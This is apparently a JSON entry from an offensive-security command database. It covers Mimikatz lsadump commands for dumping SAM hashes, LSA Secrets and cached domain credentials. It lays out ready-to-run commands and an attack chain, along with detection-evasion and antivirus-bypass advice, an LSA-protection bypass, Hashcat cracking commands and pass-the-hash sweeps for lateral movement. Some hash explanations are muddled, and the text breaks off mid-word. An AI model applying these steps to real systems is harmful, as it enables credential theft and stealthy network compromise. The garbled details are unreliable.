{
  "metadata": {
    "file_purpose": "Mimikatz lsadump Module Commands - Registry-based credential extraction from SAM, LSA Secrets, and cached domain credentials. Alternative to LSASS memory dumps when Credential Guard enabled or LSASS protected.",
    "educational_context": "Windows stores credentials in three primary locations: (1) LSASS memory (volatile, active sessions), (2) SAM database (persistent, local accounts), (3) LSA Secrets (persistent, service/autologon creds), (4) MS-Cache (persistent, domain cached creds). The lsadump module extracts from registry-backed storage (SAM/LSA) rather than process memory. This provides alternative attack path when Credential Guard blocks LSASS access or when no active sessions exist.",
    "prerequisites": [
      "Local Administrator OR SYSTEM privileges on target Windows system",
      "SAM and SYSTEM registry hives readable (default for admins)",
      "For lsadump::sam - offline dump via 'reg save' OR online with admin rights",
      "For lsadump::secrets - LSA protection NOT enabled (or bypass with /patch)",
      "For lsadump::cache - Domain-joined system with cached domain logons"
    ],
    "related_techniques": [
      "LSASS memory dump (sekurlsa::logonpasswords)",
      "DCSync (ad-dcsync.json)",
      "Pass-the-Hash (ad-pass-the-hash.json)",
      "Hashcat cracking (hashcat-crack-ntlm, hashcat-crack-mscache2)"
    ],
    "attack_chain": [
      "1. Gain local administrator access on Windows target",
      "2. Determine credential storage locations (SAM for local, LSA for service, Cache for domain)",
      "3. Extract SAM database: lsadump::sam /system:SYSTEM /sam:SAM",
      "4. Extract LSA Secrets: lsadump::secrets /system:SYSTEM /security:SECURITY",
      "5. Extract cached domain credentials: lsadump::cache /system:SYSTEM /security:SECURITY",
      "6. Parse extracted hashes (NTLM for SAM/Secrets, MS-Cache v2 for cache)",
      "7. Crack hashes offline with Hashcat or use hashes directly for Pass-the-Hash"
    ],
    "detection_evasion": [
      "Offline dump via 'reg save' generates no Mimikatz events (legitimate backup)",
      "Parse dumps on attacker system (no Mimikatz execution on target)",
      "LSA Secrets extraction may trigger Credential Guard alerts if protected",
      "SAM/SYSTEM backup is common administrative task (low suspicion)",
      "Cached credential extraction leaves no event log entries (reading registry)"
    ]
  },
  "commands": [
    {
      "id": "mimikatz-lsadump-sam",
      "name": "Mimikatz Dump SAM Database Hashes",
      "category": "post-exploit",
      "subcategory": "credential-harvesting",
      "command": ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"exit\"",
      "description": "Extract local account password hashes from Security Account Manager (SAM) database. Provides NTLM hashes for local Administrator, Guest, and user accounts. Alternative to LSASS memory dumps for local credential extraction. Works even when Credential Guard protects LSASS.",
      "variables": [],
      "flag_explanations": {
        "lsadump::sam": "Dumps the SAM (Security Account Manager) database containing local user account password hashes. WHY THIS WORKS: SAM stores NTLM hashes for local accounts (Administrator, Guest, local users) encrypted with SYSKEY (stored in SYSTEM registry hive). Mimikatz reads SAM from registry (HKLM\\SAM), decrypts using SYSKEY from SYSTEM hive, and extracts NTLM hashes. DOES NOT REQUIRE ACTIVE LOGON SESSIONS: Unlike sekurlsa::logonpasswords which needs users logged in, SAM extraction works with registry data alone.",
        "token::elevate": "Elevates current process token to SYSTEM level using token impersonation. REQUIRED FOR SAM ACCESS: SAM registry hive (HKLM\\SAM) is only readable by SYSTEM account, even administrators cannot read it directly. token::elevate steals SYSTEM token from lsass.exe or another SYSTEM process. Must run 'privilege::debug' first to obtain SeDebugPrivilege required for token theft.",
        "SAM Database Structure": "SAM contains: RID (Relative Identifier - last part of SID), Username, NTLM hash (LM hash on old systems), Account metadata (disabled, locked, password age). Located at: C:\\Windows\\System32\\config\\SAM (file-based registry hive). Automatically loaded to HKLM\\SAM at boot. Administrator always has RID 500, Guest has RID 501.",
        "Offline vs Online Extraction": "ONLINE (this command): Reads SAM directly from live registry using SYSTEM token. Advantages: Fast, no file transfer. Disadvantages: Requires Mimikatz on target, token elevation needed. OFFLINE: Export registry hives first (reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM system.save), transfer to Kali, parse with: mimikatz 'lsadump::sam /sam:sam.save /system:system.save' OR secretsdump.py -sam sam.save -system system.save LOCAL. Advantage: No Mimikatz on target, bypasses AV.",
        "Output Format": "Displays for each account: RID (hex and decimal), Username, NTLM hash (32 hex chars), LM hash (if enabled - deprecated). Example: RID : 000001f4 (500), User : Administrator, NTLM: aad3b435b51404eeaad3b435b51404ee. The first part of NTLM (aad3b435...) is empty LM hash placeholder. Actual NTLM is second half. Use full hash for Pass-the-Hash or crack with Hashcat mode 1000."
      },
      "success_indicators": [
        "Output: 'Domain : <HOSTNAME>' (local computer name, not domain)",
        "Output: 'SysKey : <hex>' (SYSKEY successfully extracted from SYSTEM hive)",
        "Output: 'RID  : 000001f4 (500)' (Administrator account always RID 500)",
        "Output: 'User : Administrator' and 'NTLM : [32-character hex hash]'",
        "Output shows local accounts: Guest (501), DefaultAccount, other local users",
        "NTLM hash format: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
      ],
      "failure_indicators": [
        "ERROR: 'kuhl_m_lsadump_sam_handle ; SamConnect' (cannot connect to SAM)",
        "ERROR: 'Handle on memory' (insufficient privileges, token elevation failed)",
        "ERROR: 'ERROR kull_m_registry_OpenAndQueryWithAlloc' (cannot read SAM registry)",
        "Output shows only 'Domain : <HOST>' but no accounts (SAM read failed)",
        "ERROR: 'RtlAdjustPrivilege' (privilege::debug not run first)"
      ],
      "troubleshooting": {
        "Cannot connect to SAM / Handle on memory error": "Token elevation to SYSTEM failed. Solution: Verify sequence: (1) Run 'privilege::debug' first → should see 'Privilege '20' OK'. (2) Run 'token::elevate' → should see 'Token Id : 0' and 'User name : NT AUTHORITY\\SYSTEM'. (3) Then run 'lsadump::sam'. If still failing, use PsExec to get SYSTEM shell: PsExec.exe -s -i cmd.exe, then run Mimikatz from SYSTEM context directly.",
        "ERROR kull_m_registry_OpenAndQueryWithAlloc": "Cannot read SAM or SYSTEM registry hives. Causes: (1) Not running with admin rights. Solution: Verify with 'whoami /groups' - must see BUILTIN\\Administrators. (2) SAM hive locked or corrupted. Solution: Use offline method - export with 'reg save HKLM\\SAM sam.save' and parse offline. (3) Third-party security software blocking registry access. Solution: Disable AV or use offline extraction.",
        "Accounts shown but NTLM field empty": "Account has no password set or password is blank. Blank password NTLM hash: 31d6cfe0d16ae931b73c59d7e0c089c0. Common for: Guest account (often disabled with blank password), Service accounts with 'Password not required' flag. Use blank password for authentication or Pass-the-Hash with blank hash.",
        "Want to parse SAM offline without target execution": "Offline extraction preferred for OPSEC. Steps: (1) On target with admin rights: reg save HKLM\\SAM C:\\Temp\\sam.save && reg save HKLM\\SYSTEM C:\\Temp\\system.save. (2) Transfer files to Kali: download sam.save, download system.save (via Evil-WinRM, SMB, HTTP). (3) On Kali: impacket-secretsdump -sam sam.save -system system.save LOCAL OR mimikatz 'lsadump::sam /sam:sam.save /system:system.save'. Advantage: No Mimikatz execution on target, bypasses AV, forensically cleaner."
      },
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "hashcat-crack-ntlm",
        "pth-cme-local-admin"
      ],
      "tags": [
        "MIMIKATZ",
        "SAM_DATABASE",
        "CREDENTIAL_HARVESTING",
        "NTLM_HASH",
        "LOCAL_ACCOUNTS",
        "REGISTRY_EXTRACTION",
        "PASS_THE_HASH",
        "ACTIVE_DIRECTORY",
        "POST_EXPLOITATION"
      ],
      "notes": "METHODOLOGY: SAM dumps are CRITICAL for local admin password reuse attacks. COMMON SCENARIO: Extract Administrator NTLM from one workstation, test against all other workstations with Pass-the-Hash. Local admin password reuse is extremely common in enterprise environments.\n\nTIME ESTIMATE: 15-30 seconds (5 sec privilege elevation, 5 sec extraction, 5-20 sec parsing output)\n\nMANUAL ALTERNATIVES:\n1. Offline extraction with reg save (recommended for stealth):\n   reg save HKLM\\SAM sam.save\n   reg save HKLM\\SYSTEM system.save\n   download files, parse on Kali with impacket-secretsdump or Mimikatz\n\n2. Impacket secretsdump.py (Linux):\n   impacket-secretsdump -sam sam.save -system system.save LOCAL\n   OR remote: impacket-secretsdump DOMAIN/user:pass@TARGET\n\n3. pwdump/fgdump (legacy tools, similar functionality)\n\nSAM VS LSASS MEMORY:\nSAM Database (this command):\n  - Pros: Works without active sessions, bypasses Credential Guard, persistent storage\n  - Cons: Only local accounts (no domain users unless cached), no plaintext passwords\n  - Contains: Local Administrator, Guest, local users, NTLM hashes\n\nLSASS Memory (sekurlsa::logonpasswords):\n  - Pros: Domain users, plaintext passwords (if cached), service sessions\n  - Cons: Requires active logon sessions, blocked by Credential Guard, volatile\n  - Contains: Current logged-on users (local + domain), NTLM + plaintext\n\nPRACTICAL TIPS:\n1. ALWAYS extract SAM on every compromised system (even if sekurlsa works)\n2. Test Administrator hash across ALL systems with crackmapexec: crackmapexec smb 192.168.1.0/24 -u Administrator -H <NTLM>\n3. Document hash reuse patterns: SYSTEM_A_Admin → SYSTEM_B_Admin (same hash = password reuse)\n4. Offline extraction preferred for time: reg save + download + parse on Kali (no AV issues)\n5. Save hashes immediately: username:RID:LM:NTLM format for easy reference\n6. Combine with domain creds for complete picture\n\nLOCAL ADMIN PASSWORD REUSE ATTACK:\n1. Compromise WORKSTATION-01 with web exploit (local admin access)\n2. Extract SAM: Administrator NTLM = aad3...b73c5 (example)\n3. Test hash across network: crackmapexec smb 192.168.1.0/24 -u Administrator -H aad3...b73c5 --local-auth\n4. Discover WORKSTATION-02, WORKSTATION-03, SERVER-01 have same Administrator password\n5. Lateral movement to all systems using single hash\n6. Often leads to Domain Admin: DA logged into SERVER-01 → dump credentials\n\nHASH FORMAT EXPLANATION:\naad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c\n  ^^^^^^^^^^^^^ (Part 1)         ^^^^^^^^^^^^^ (Part 2)\n  LM Hash (disabled/empty)       NTLM Hash (actual password hash)\n\nPart 1 (aad3b435...): Empty LM hash placeholder (LM disabled on modern Windows)\nPart 2 (8846f7ea...): NTLM hash of actual password (use this for Pass-the-Hash or cracking)\n\nFor Pass-the-Hash: Use FULL hash with colon separator\nFor Hashcat cracking: Extract NTLM part only (after colon) with mode 1000\n\nDETECTION NOTES:\n- Event ID 4663: Registry value access (if auditing enabled on SAM hive)\n- Event ID 4624: Token elevation visible as SYSTEM logon\n- Offline 'reg save' generates Event ID 4656 (registry key access) - legitimate admin task\n- Mimikatz execution may trigger AV/EDR (focus on binary, not action)\n- Low detection for offline extraction via reg save (common backup task)\n\nCOMMON MISTAKES:\n1. Not running privilege::debug first (SeDebugPrivilege required for token::elevate)\n2. Skipping token::elevate (SAM requires SYSTEM token)\n3. Not testing Administrator hash across other systems (missing lateral movement)\n4. Using only LM hash part (deprecated, use NTLM)\n5. Not saving output immediately (lost on disconnect)\n\nADVANCED USAGE:\n- Extract from offline registry: lsadump::sam /sam:sam.save /system:system.save\n- Remote SAM dump: Use impacket-secretsdump or Invoke-Mimikatz remotely\n- Volume Shadow Copy: Extract SAM from VSS for historical passwords\n\nWHEN SAM DUMP IS MOST VALUABLE:\n- Credential Guard blocks LSASS memory (no sekurlsa::logonpasswords)\n- No domain users logged in (sekurlsa would be empty)\n- Want persistent hashes (not dependent on current sessions)\n- Offline analysis required (stealth, no Mimikatz on target)\n- Testing local admin password reuse across enterprise"
    },
    {
      "id": "mimikatz-lsadump-secrets",
      "name": "Mimikatz Dump LSA Secrets",
      "category": "post-exploit",
      "subcategory": "credential-harvesting",
      "command": ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::secrets\" \"exit\"",
      "description": "Extract Local Security Authority (LSA) Secrets containing service account passwords, scheduled task credentials, DPAPI master keys, VPN passwords, and autologon credentials. More comprehensive than SAM dump. Essential for service account harvesting and finding plaintext passwords.",
      "variables": [],
      "flag_explanations": {
        "lsadump::secrets": "Dumps LSA (Local Security Authority) Secrets from registry. WHY THIS MATTERS: LSA Secrets contain PLAINTEXT or reversibly-encrypted credentials for: (1) Service accounts running Windows services (SQL Server, IIS, etc.). (2) Scheduled tasks running as specific users. (3) Autologon credentials (if enabled - plaintext domain/local creds). (4) DPAPI Master Keys (decrypt user data). (5) Machine account password (for domain communications). (6) VPN/802.1X credentials. LOCATION: Encrypted in HKLM\\SECURITY\\Policy\\Secrets registry hive. Decrypted using LSA policy key derived from SYSTEM hive.",
        "token::elevate": "Elevates to SYSTEM token (same as SAM extraction). REQUIRED: SECURITY registry hive (containing LSA Secrets) is only readable by SYSTEM. Token impersonation steals SYSTEM token from another process. Must run 'privilege::debug' first for SeDebugPrivilege.",
        "LSA Secrets Categories": "Common secret types: (1) _SC_<ServiceName>: Service account password (e.g., _SC_MSSQLSERVER for SQL Server). (2) DefaultPassword: Autologon password if enabled (PLAINTEXT). (3) DPAPI_SYSTEM: DPAPI master keys for SYSTEM account (decrypt system-level protected data). (4) $MACHINE.ACC: Domain computer account password (machine account NTLM hash). (5) L$<string>: Dial-up/VPN credentials. (6) NL$KM: Computer account password for Netlogon (older systems).",
        "Service Account Passwords": "Services running as domain accounts store passwords in LSA Secrets. Example: Microsoft SQL Server configured to run as CORP\\sql_service stores sql_service password in _SC_MSSQLSERVER secret. WHY CRITICAL: Service accounts often have: (1) High privileges (Domain Admin, SQL sysadmin, local admin on multiple servers). (2) Weak passwords (Password1!, Company123!). (3) No password expiration. (4) Rarely monitored for compromise. Extracting service passwords enables lateral movement and privilege escalation.",
        "Autologon Credentials": "Windows Autologon feature stores plaintext credentials in LSA Secrets for automatic login. Secret names: DefaultDomainName, DefaultUserName, DefaultPassword. If enabled (common on kiosks, lab systems, legacy servers), provides immediate domain/local account credentials. Check registry first: reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword. If value exists, lsadump::secrets retrieves plaintext password."
      },
      "success_indicators": [
        "Output: 'Domain : <HOSTNAME>' (local system name)",
        "Output: 'SysKey : <hex>' (encryption key successfully extracted)",
        "Output: 'Secret : <secret_name>' for each LSA Secret",
        "Service secrets shown: 'Secret : _SC_<ServiceName>' with 'text: <password>' or 'NTLM: <hash>'",
        "Autologon if present: 'Secret : DefaultPassword' with 'text: <plaintext_password>'",
        "DPAPI key shown: 'Secret : DPAPI_SYSTEM' with 'full: <hex_key>'",
        "Machine account shown: 'Secret : $MACHINE.ACC' with 'NTLM: <hash>'"
      ],
      "failure_indicators": [
        "ERROR: 'kuhl_m_lsadump_secrets ; SamConnect' (cannot access LSA)",
        "ERROR: 'Handle on memory' (token elevation failed, not SYSTEM)",
        "ERROR: 'ERROR kull_m_registry_OpenAndQueryWithAlloc' (SECURITY hive read failed)",
        "Output shows only 'Domain:' but no secrets (LSA access blocked)",
        "Empty secrets list (LSA Secrets Protection enabled via GPO)"
      ],
      "troubleshooting": {
        "No secrets displayed / Empty output": "Possible causes: (1) LSA Secrets Protection (RunAsPPL) enabled via GPO. Solution: Use /patch flag (lsadump::secrets /patch) to bypass protection OR use mimidrv.sys driver. Check protection: reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL (value 1 = protected). (2) No LSA secrets configured on system. Solution: Rare - most systems have at least $MACHINE.ACC. Verify with offline export. (3) Token elevation failed. Solution: Verify 'token::elevate' succeeded - should show 'User name : NT AUTHORITY\\SYSTEM'.",
        "Cannot access SECURITY hive": "Registry access denied or hive locked. Solution: Same as SAM troubleshooting - use offline extraction: reg save HKLM\\SECURITY security.save && reg save HKLM\\SYSTEM system.save. Parse on Kali: impacket-secretsdump -security security.save -system system.save LOCAL OR mimikatz 'lsadump::secrets /security:security.save /system:system.save'.",
        "Service secrets show 'NULL' instead of password": "Service not configured with credentials or using LocalSystem/NetworkService. Explanation: Services running as built-in accounts (LocalSystem, LocalService, NetworkService) have no stored passwords. Only services configured with 'Log on as: This account' store credentials. Check service config: sc qc <ServiceName> - look for 'SERVICE_START_NAME : DOMAIN\\user' (has password) vs 'LocalSystem' (no password).",
        "Autologon credentials not found": "Autologon not enabled on system. Verification: reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon (value 1 = enabled, 0 = disabled). Only systems with autologon enabled store DefaultPassword in LSA Secrets. Common on: kiosks, lab environments, legacy servers with management consoles."
      },
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "mimikatz-lsadump-sam",
        "windows-service-enumeration",
        "hashcat-crack-ntlm"
      ],
      "tags": [
        "MIMIKATZ",
        "LSA_SECRETS",
        "CREDENTIAL_HARVESTING",
        "SERVICE_ACCOUNTS",
        "PLAINTEXT_PASSWORD",
        "AUTOLOGON",
        "DPAPI",
        "REGISTRY_EXTRACTION",
        "ACTIVE_DIRECTORY",
        "POST_EXPLOITATION"
      ],
      "notes": "METHODOLOGY: LSA Secrets extraction is HIGH PRIORITY for finding service account passwords. COMMON SCENARIO: SQL Server running as domain account sql_service. Extract password from _SC_MSSQLSERVER secret, gain SQL sysadmin access, enable xp_cmdshell for command execution.\n\nTIME ESTIMATE: 15-30 seconds (5 sec elevation, 10-25 sec extraction and parsing)\n\nMANUAL ALTERNATIVES:\n1. Offline extraction (recommended for OPSEC):\n   reg save HKLM\\SECURITY security.save\n   reg save HKLM\\SYSTEM system.save\n   impacket-secretsdump -security security.save -system system.save LOCAL\n\n2. Impacket remote extraction:\n   impacket-secretsdump DOMAIN/user:pass@TARGET\n   (extracts SAM + LSA Secrets + cached credentials in one command)\n\n3. PowerShell LSA extraction:\n   Invoke-Mimikatz -Command '\"privilege::debug\" \"token::elevate\" \"lsadump::secrets\"'\n\nLSA SECRETS VS SAM VS LSASS:\nLSA Secrets (this command):\n  - Contains: Service passwords (plaintext/NTLM), autologon creds (plaintext), DPAPI keys, machine account\n  - Pros: Plaintext passwords, service account goldmine, works without active sessions\n  - Cons: Requires SYSTEM, may be protected by RunAsPPL, offline extraction cleaner\n\nSAM Database:\n  - Contains: Local account NTLM hashes (Administrator, local users)\n  - Pros: Simple, always present, bypasses Credential Guard\n  - Cons: No domain accounts, no plaintext, only local accounts\n\nLSASS Memory:\n  - Contains: Active session credentials (domain users, plaintext passwords, tickets)\n  - Pros: Domain credentials, Kerberos tickets, plaintext if cached\n  - Cons: Requires active logons, blocked by Credential Guard, volatile\n\nPRACTICAL TIPS:\n1. Extract LSA Secrets on EVERY compromised server (especially database/web servers)\n2. Look for service account patterns: sql_service, iis_service, backup_service (often weak passwords)\n3. Test autologon first (faster): reg query Winlogon /v DefaultPassword\n4. Service passwords often reused across servers (test sql_service password on all SQL servers)\n5. DPAPI_SYSTEM key enables decryption of scheduled tasks, saved credentials, browser passwords\n6. Document ALL passwords: service name, account, password, NTLM hash\n\nCOMMON LSA SECRET FINDS:\n1. SQL Server service account: _SC_MSSQLSERVER → sql_service plaintext password → SQL sysadmin → xp_cmdshell\n2. Autologon credentials: DefaultPassword → domain\\admin plaintext → immediate DA access\n3. Scheduled task credentials: _SC_<TaskName> → backup account password → Volume Shadow Copy access\n4. VPN credentials: L$<VPNName> → domain user VPN password → password spray attack vector\n5. Machine account password: $MACHINE.ACC → computer object NTLM → DCSync with computer account\n\nSERVICE ACCOUNT ATTACK FLOW:\n1. Enumerate services: sc query | findstr SERVICE_NAME\n2. Check service logon accounts: sc qc <ServiceName> → look for 'SERVICE_START_NAME : DOMAIN\\user'\n3. Extract LSA Secrets: lsadump::secrets → find _SC_<ServiceName> → get plaintext password\n4. Test account privileges: net user <account> /domain → check group membership\n5. Leverage service: (SQL) xp_cmdshell, (IIS) app pool impersonation, (Backup) VSS access\n6. Lateral movement: Test password on other systems with same service\n\nDPAPI MASTER KEY USAGE:\nDPAPI_SYSTEM secret enables decryption of:\n- Scheduled task credentials (C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\)\n- Saved RDP credentials\n- Windows Vault secrets (Certificate Private Keys, Web Credentials)\n- Chrome/Edge saved passwords (SYSTEM context)\n\nExtraction: Get DPAPI_SYSTEM full key → Use mimikatz dpapi module to decrypt protected data\n\nDETECTION NOTES:\n- Event ID 4663: Object access (if auditing enabled on SECURITY hive)\n- Event ID 4656: Handle to object (registry key access)\n- LSA Protection (RunAsPPL) blocks access, generates Event ID 3033/3063\n- Offline 'reg save' is legitimate admin task (low suspicion)\n- No specific event for LSA Secrets extraction (reading registry data)\n\nCOMMON MISTAKES:\n1. Not checking autologon first (fastest win if enabled)\n2. Ignoring service accounts (_SC_* secrets) - often high-privilege\n3. Not testing service passwords on other systems (lateral movement opportunity)\n4. Skipping DPAPI_SYSTEM key (needed for decrypting protected data)\n5. Not documenting machine account password (useful for Silver Tickets)\n\nADVANCED USAGE:\n- Bypass LSA Protection: lsadump::secrets /patch (patches LSASS in-memory)\n- Offline parsing: lsadump::secrets /security:security.save /system:system.save\n- Remote extraction: Invoke-Mimikatz on remote system via PS remoting\n- DPAPI decryption: Use extracted DPAPI_SYSTEM with dpapi::chrome/cred commands"
    },
    {
      "id": "mimikatz-lsadump-cache",
      "name": "Mimikatz Dump Cached Domain Credentials",
      "category": "post-exploit",
      "subcategory": "credential-harvesting",
      "command": ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::cache\" \"exit\"",
      "description": "Extract MS-Cache v2 hashes (domain cached credentials - DCC2) from registry. Enables offline authentication when domain controller unavailable. Provides domain user password hashes for offline cracking. Works on domain-joined systems with cached logons enabled.",
      "variables": [],
      "flag_explanations": {
        "lsadump::cache": "Dumps cached domain credentials (MS-Cache v2 / DCC2) from registry. WHY CACHED CREDENTIALS EXIST: Domain-joined Windows systems cache domain user credentials locally to enable login when domain controller is unreachable (laptop offline, network down, DC maintenance). By default, Windows caches last 10 domain logons. STORED LOCATION: HKLM\\SECURITY\\Cache registry hive, encrypted with LSA boot key. HASH FORMAT: MS-Cache v2 (DCC2) = PBKDF2-HMAC-SHA1 with 10240 iterations + username + domain. CANNOT PASS-THE-HASH: Unlike NTLM, MS-Cache hashes are for verification only (offline logon), not network authentication. Must crack hash to obtain plaintext password.",
        "token::elevate": "Elevates to SYSTEM token. REQUIRED: SECURITY registry hive containing cached credentials is SYSTEM-only accessible. Same privilege requirements as lsadump::secrets. Must run 'privilege::debug' first.",
        "MS-Cache v2 (DCC2) Format": "Hash format: Username:Hash (no domain in hash, domain stored separately). Hash structure: PBKDF2-HMAC-SHA1(10240, UTF-16-LE(Username), MD4(MD4(Password))). Includes: Username in UTF-16 Little Endian format (case-sensitive) + Domain name + Iteration count 10240. Hashcat mode 2100 for cracking. MUCH SLOWER to crack than NTLM due to 10240 iterations (designed to resist brute force).",
        "Cached Credential Limitations": "Windows caches credentials for OFFLINE LOGON only, not network authentication. Limitations: (1) Cannot Pass-the-Hash with cached credentials (offline verification only). (2) Must crack hash to obtain plaintext password. (3) Only interactive logons cached (not service accounts or scheduled tasks). (4) Default limit: 10 cached credentials (configurable via GPO). (5) No cached credentials for local accounts (domain accounts only).",
        "Cache Configuration": "Default: 10 cached logons (CachedLogonsCount = 10). GPO: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → 'Interactive logon: Number of previous logons to cache'. Value 0 = disabled (no cache), 1-50 = number of credentials to cache. Check current setting: reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v CachedLogonsCount. Highly secure environments may disable caching (value 0)."
      },
      "success_indicators": [
        "Output: 'Domain : <DOMAIN_NAME>' (cached credential domain)",
        "Output: 'SysKey : <hex>' (boot key extracted from SYSTEM hive)",
        "Output: 'User : <username>' with 'MsCacheV2 : <hash>' for each cached credential",
        "Hash format: 64 hexadecimal characters (MS-Cache v2 / DCC2)",
        "Multiple users shown (up to 10 by default, based on CachedLogonsCount)",
        "Example output: 'User : jdoe', 'MsCacheV2 : e2d81...7f3c1' (64 chars)"
      ],
      "failure_indicators": [
        "ERROR: 'kuhl_m_lsadump_cache ; SamConnect' (cannot access NL$<n> cache)",
        "ERROR: 'Handle on memory' (token elevation failed)",
        "ERROR: 'ERROR kull_m_registry_OpenAndQueryWithAlloc' (SECURITY hive read failed)",
        "Output: 'No cache available' (cached logons disabled or no domain logons)",
        "Empty output (no domain users have logged in OR CachedLogonsCount = 0)"
      ],
      "troubleshooting": {
        "No cache available / No cached credentials": "No domain credentials cached on system. Causes: (1) Cached logons disabled via GPO (CachedLogonsCount = 0). Check: reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v CachedLogonsCount. (2) System never joined to domain (workgroup system). (3) No domain users have logged in interactively (only local accounts used). (4) Cache cleared by admin or policy. Solution: This is normal for workgroup systems or servers where domain users don't log in interactively. Focus on SAM/LSA Secrets instead.",
        "Cannot access SECURITY hive": "Same as lsadump::secrets - SECURITY hive requires SYSTEM token. Solution: Verify 'token::elevate' succeeded. Alternative: Offline extraction: reg save HKLM\\SECURITY security.save && reg save HKLM\\SYSTEM system.save. Parse with: mimikatz 'lsadump::cache /security:security.save /system:system.save' OR impacket-secretsdump.",
        "Only 1-2 cached credentials shown (expected 10)": "Fewer than 10 domain users have logged in, or CachedLogonsCount set lower than default. Explanation: Windows only caches credentials for users who have actually logged in interactively. If only 2 domain users ever logged in, only 2 credentials cached. Check configuration: reg query Winlogon /v CachedLogonsCount (shows max, not actual count).",
        "Want to crack MS-Cache v2 hash": "Cracking DCC2 much slower than NTLM (10240 iterations). Tools: (1) Hashcat: hashcat -m 2100 -a 0 mscache.txt rockyou.txt (mode 2100 = MS-Cache v2). (2) John: john --format=mscash2 mscache.txt --wordlist=rockyou.txt. Hash format for Hashcat: $DCC2$10240#username#hash (Mimikatz output needs formatting). TIME ESTIMATE: ~10-100x slower than NTLM cracking due to iterations. Weak passwords (Password1!) crack in seconds-minutes, strong passwords may be infeasible."
      },
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "hashcat-crack-mscache2",
        "mimikatz-lsadump-sam",
        "mimikatz-lsadump-secrets"
      ],
      "tags": [
        "MIMIKATZ",
        "CACHED_CREDENTIALS",
        "MS_CACHE_V2",
        "DCC2",
        "CREDENTIAL_HARVESTING",
        "OFFLINE_LOGON",
        "HASHCAT",
        "REGISTRY_EXTRACTION",
        "ACTIVE_DIRECTORY",
        "POST_EXPLOITATION"
      ],
      "notes": "METHODOLOGY: Cached credentials provide domain user password hashes when no domain users are actively logged in (sekurlsa::logonpasswords empty). COMMON SCENARIO: Compromise workstation with local admin, no domain users logged in, but workstation is domain-joined. Extract cached credentials to obtain historical domain user hashes.\n\nTIME ESTIMATE: 15-30 seconds extraction + 5 minutes to 24+ hours cracking (depends on password complexity)\n\nMANUAL ALTERNATIVES:\n1. Offline extraction (recommended):\n   reg save HKLM\\SECURITY security.save\n   reg save HKLM\\SYSTEM system.save\n   impacket-secretsdump -security security.save -system system.save LOCAL\n\n2. Impacket remote (extracts SAM + Secrets + Cache):\n   impacket-secretsdump DOMAIN/user:pass@TARGET\n\n3. Hashcat cracking:\n   hashcat -m 2100 '$DCC2$10240#jdoe#e2d81...7f3c1' rockyou.txt\n\nMS-CACHE V2 VS NTLM:\nMS-Cache v2 (DCC2):\n  - Purpose: Offline domain logon verification\n  - Iterations: 10240 (PBKDF2)\n  - Cracking: 10-100x slower than NTLM\n  - Pass-the-Hash: NO (cannot use for network authentication)\n  - Usage: Crack to plaintext → use plaintext for authentication\n\nNTLM:\n  - Purpose: Network authentication\n  - Iterations: 0 (single MD4 hash)\n  - Cracking: Fast\n  - Pass-the-Hash: YES (use hash directly)\n  - Usage: Pass-the-Hash OR crack to plaintext\n\nPRACTICAL TIPS:\n1. Extract cached credentials even if sekurlsa::logonpasswords found domain users (cache provides historical users)\n2. Cached creds often include privileged users (IT admins logging in for maintenance)\n3. Crack weak passwords first (common patterns: Password1!, Company2023!, Welcome123!)\n4. Cached credentials survive reboot (persistent in registry vs volatile LSASS memory)\n5. Combine with SAM dump: local admin hash + cached domain user hashes = comprehensive credential picture\n6. Offline cracking: Extract on target, crack on powerful Kali/Windows with GPU\n\nCRACKING STRATEGY:\n1. Format hash for Hashcat: $DCC2$10240#<username>#<hash>\n   Example: $DCC2$10240#jdoe#e2d81a7f8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5\n\n2. Wordlist attack (fastest):\n   hashcat -m 2100 -a 0 cache.txt rockyou.txt\n\n3. Rule-based attack (medium):\n   hashcat -m 2100 -a 0 cache.txt rockyou.txt -r best64.rule\n\n4. Mask attack for known patterns:\n   hashcat -m 2100 -a 3 cache.txt ?u?l?l?l?l?l?d?d?d?d! (Password1234! pattern)\n\n5. Time estimates:\n   - Weak passwords (Password1!): Seconds to minutes\n   - Medium passwords (Company2023!): Minutes to hours\n   - Strong passwords (random 12+ chars): Infeasible without GPU cluster\n\nWHEN CACHED CREDENTIALS ARE MOST VALUABLE:\n- No domain users currently logged in (sekurlsa::logonpasswords shows only local accounts)\n- Historical domain user access needed (who logged in previously?)\n- Offline cracking scenario (extract hashes, crack on dedicated cracking rig)\n- Domain controller unreachable (cached creds enable offline attack continuation)\n- Credential Guard blocks LSASS (cache provides alternative domain credential source)\n\nCACHED CREDENTIAL ATTACK FLOW:\n1. Compromise workstation/server with local admin\n2. Check for domain membership: systeminfo | findstr Domain\n3. Extract cached credentials: lsadump::cache\n4. Format hashes for Hashcat: $DCC2$10240#<user>#<hash>\n5. Crack with wordlist + rules: hashcat -m 2100 cache.txt rockyou.txt -r best64.rule\n6. Successful crack → plaintext password\n7. Test password with: crackmapexec smb DC01 -u jdoe -p 'Password123!' -d CORP\n8. Valid credentials → lateral movement, privilege escalation, domain enumeration\n\nDETECTION NOTES:\n- Event ID 4663/4656: Object/registry access (if auditing enabled)\n- Offline reg save: Legitimate admin backup (low suspicion)\n- No specific event for cache extraction (reading registry data)\n- Cracking happens offline (no network events)\n- Password reuse detected via Event ID 4624 (logon success) when cracked password used\n\nCOMMON 